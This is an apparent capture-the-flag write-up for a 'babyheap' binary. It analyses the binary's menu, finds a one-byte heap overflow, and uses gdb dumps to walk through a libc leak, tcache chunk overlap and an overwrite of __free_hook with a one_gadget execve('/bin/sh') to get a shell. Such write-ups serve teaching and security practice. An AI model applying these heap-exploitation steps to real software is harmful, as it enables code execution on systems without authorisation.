# babyheap

```bash
❯ file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=afa4d4d076786b1a690f1a49923d1e054027e8e7, for GNU/Linux 3.2.0, stripped
❯ checksec babyheap
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
Sooo full protection.

Seems to be a classic heap allocation executable with a menu:
```bash
-----Yet Another Babyheap!-----
[M]alloc 
[F]ree 
[S]how 
[E]xit 
------------------------
Command:
> 
```

## Analysis

### global objects

There seems to be two global object used accross the different functions, one for keeping a list of allocated pointers, the other for showing the size of allocated pointers.

### [M]alloc

There seems to be a bit of logic with the sizing of the allocation. If the requested size is more than `0x178`, it will error out. Else it will either:
* allocate `0xf8` if the requested size was strictly less than `0xf9`
* or else allocate `0x178`
What is suprising is that it keeps the requested size in the size array instead of the actual size of the chunk.

It will also look for the first free entry in the pointer list in order to save the allocated chunk into it. So if I have `0, 1, 2, 3` allocated entries, free `1 & 2`, then allocate one chunk I'll have `0, 1, 3` as allocated entries.

When allocating `0xf8` sized chunks, there seems to be a 1 byte overflow since it will read until it reach `0xf8` with `0` included, which makes it `0xf9` bytes. It will precisely overflow the next chunk on the previous used flag and part of the size.

There can be no more than 10 chunks.

### [F]ree

Free seems to be quite clean:
* it checks the index value (0 <= index < 10)
* it errors out if the address we want to free is null
* put zeros in the region to be freed
* set the pointer to null
* set a boolean for the usage to false

### [S]how

Nothing really pecular here, it will just displays the selected chunk if it exists. Probably useful for the leak.

## Exploit

Looking at the few options we have, we'll probably have to play with the particular sizing strategy with malloc which gives us a single byte overflow.

We're gonna use this single byte overflow in order to play with the size of the chunks. To be more precise, we'll change the size of a freed chunk so that it would spill over another free chunk following it.

I'll try to illustrate it with gdb. First with the setup we need 3 chunks, and free 2 of them so that the last to be freed is just above an allocated one.
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101  <- second freed chunk>
0x5606c86472a0:	0x00005606c86474a0	0x00005606c8647010
[...]
0x5606c8647390:	0x0000000000000000	0x0000000000000101
0x5606c86473a0:	0x6161616161616161	0x6161616161616161
[...]
0x5606c8647490:	0x6161616161616161	0x0000000000000101  <- first freed chunk>
0x5606c86474a0:	0x0000000000000000	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

Then reallocate the last to be freed, and overwrite the header of the next chunk so that it fell in the other category of the allocation (aka chunks of size 0x180).
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101  <- freshly reallocated chunk>
0x5606c86472a0:	0x6262626262626262	0x6262626262626262
[...]
0x5606c8647390:	0x6262626262626262	0x0000000000000180  <- metadata partially overwritten>
0x5606c86473a0:	0x6161616161616161	0x6161616161616161
[...]
0x5606c8647490:	0x6161616161616161	0x0000000000000101  <- first freed chunk>
0x5606c86474a0:	0x0000000000000000	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

Then we free the overwritten chunk, so that it would go in the tcache for the chunks of size 0x180.
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101
0x5606c86472a0:	0x6262626262626262	0x6262626262626262
[...]
0x5606c8647390:	0x6262626262626262	0x0000000000000180  <- freshly freed chunk, metadata partially overwritten>
0x5606c86473a0:	0x0000000000000000	0x00005606c8647010
[...]
0x5606c8647490:	0x0000000000000000	0x0000000000000101  <- first freed chunk>
0x5606c86474a0:	0x0000000000000000	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

Now if we allocate a chunk of size 0x180, we are able to overwrite part of the chunk that was just after it. We do so in order to be able to print the address that was stored in it.
```
0x5606c8647290:	0x0000000000000000	0x0000000000000101
0x5606c86472a0:	0x6262626262626262	0x6262626262626262
[...]
0x5606c8647390:	0x6262626262626262	0x0000000000000180
0x5606c86473a0:	0x6464646464646464	0x6464646464646464
[...]
0x5606c8647490:	0x6464646464646464	0x6464646464646464  <- overwritten header of first freed chunk>
0x5606c86474a0:	0x6464646464646464	0x00005606c8647010
0x5606c86474b0:	0x0000000000000000	0x0000000000000000
```

However this address is not very interesting to leak. In order to have something better, we'll also fill smallbin in order to have a leak to libc. With some adjustements it will look like this:
```
0x5613c366c290:	0x0000000000000000	0x0000000000000101  <- chunk that overwrites size of next>
0x5613c366c2a0:	0x6262626262626262	0x6262626262626262
[...]
0x5613c366c390:	0x6262626262626262	0x0000000000000180  <- overwritten chunk that has been reallocated>
0x5613c366c3a0:	0x6464646464646464	0x6464646464646464
[...]
0x5613c366c490:	0x6464646464646464	0x6464646464646464  <- following chunk (in small bin) with its header erased>
0x5613c366c4a0:	0x00007f144e46ecd0	0x00007f144e46ecd0  <- the leak to libc we wanted ;)>
```

The leak pointing to:
```
gef➤  x 0x00007f144e46ecd0
0x7f144e46ecd0 <main_arena+336>:	0x00007f144e46ecc0
```

The rest of the exploit will revolves around faking a chunk and allocate it in order to have write access anywhere. To do so, we will overwrite size information in tcache in order to create an overlapping chunk in tcache. This overlapping chunk will overwrite a fd address of a freed chunk just after that one. Upon allocation of the chunk with the overwritten fd pointer, we will create a fake freed chunk, pointing wherever we want it to.

We will then only have to allocate it and write anything (say, a gadget) in order to complete our exploit. As per the tutorial, we will write to `__malloc_hook`.

Gadget to write to malloc:
```
❯ one_gadget libc-2.31.so
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

For all of them the conditions were not met (I exit in sigsev), but I have some hopes for the first one. Let's see if we can set r12 to NULL. 

But using a gadget will mean putting two addresses, and the executable will stop at the first null bytes. So I'll have to try something else.

I decided to overwrite `free_hook` instead of `malloc_hook`, in hope that the registers would be in a different state and allow me to launch my exploit. And indeed that worked for me !